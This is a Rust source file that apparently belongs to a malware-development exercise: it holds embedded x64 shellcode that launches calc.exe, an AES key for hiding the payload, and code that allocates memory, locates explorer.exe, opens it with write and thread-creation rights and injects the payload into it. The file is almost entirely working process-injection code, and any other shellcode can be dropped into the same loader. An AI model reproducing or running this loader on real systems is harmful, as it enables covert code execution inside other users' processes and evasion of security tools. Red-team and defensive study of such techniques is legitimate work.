#![allow(non_snake_case)]
mod aes;
mod find_target;
mod inject;
use std::ptr;
use winapi::{
    ctypes::c_void,
    shared::minwindef::FALSE,
    um::{
        handleapi::CloseHandle,
        memoryapi::VirtualAlloc,
        processthreadsapi::OpenProcess,
        winnt::RtlMoveMemory,
        winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_CREATE_THREAD,
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

fn main() {
    // Get key and payload by running aesencrypt.py
    // python.exe .\aesencrypt.py calc.bin
    println!("Got key and payload from aesencrypt.py");
    let key: &[u8] = &[
        0xdf, 0x44, 0x93, 0x59, 0xc3, 0x2f, 0x1d, 0xff, 0xef, 0x4f, 0x58, 0x24, 0xd4, 0x5b, 0x11,
        0x4,
    ];
    let payload: &[u8] = &[
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    ];

    // Allocate memory for the payload
    let exec_mem: *mut u8;
    unsafe {
        exec_mem = VirtualAlloc(
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;
    }
    #[cfg(debug_assertions)]
    {
        println!("{:<20} : {:p}", "calc_payload addr", payload.as_ptr());
        println!("{:<20} : {:p}", "exec_mem addr", exec_mem);

        println!("\nHit me 1st!\n");
        std::io::stdin().read_line(&mut String::new()).unwrap();
    }

    // Decrypt the payload
    let mut decrypted_payload = payload.to_vec();
    //aes::aes_decrypt(&mut decrypted_payload, key);

    println!("Decrypted payload: {:?}", decrypted_payload);

    // Copy the payload to the allocated buffer
    unsafe {
        RtlMoveMemory(
            exec_mem as *mut c_void,
            decrypted_payload.as_ptr() as *const c_void,
            payload.len(),
        );
    }

    println!("Payload copied to allocated memory");

    // Find target process
    let pid = find_target::find_target("explorer.exe");

    // If pid is not 0, inject payload into target process
    if pid != 0 {
        println!("PID = {}", pid);
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        let h_proc = unsafe {
            OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                FALSE,
                pid,
            )
        };

        println!("h_proc = {:p}", h_proc);
        std::io::stdin().read_line(&mut String::new()).unwrap();

        // If h_proc is not null, inject payload into target process
        if !h_proc.is_null() {
            inject::inject(h_proc, payload);
            unsafe { CloseHandle(h_proc) };
        }
    }
}
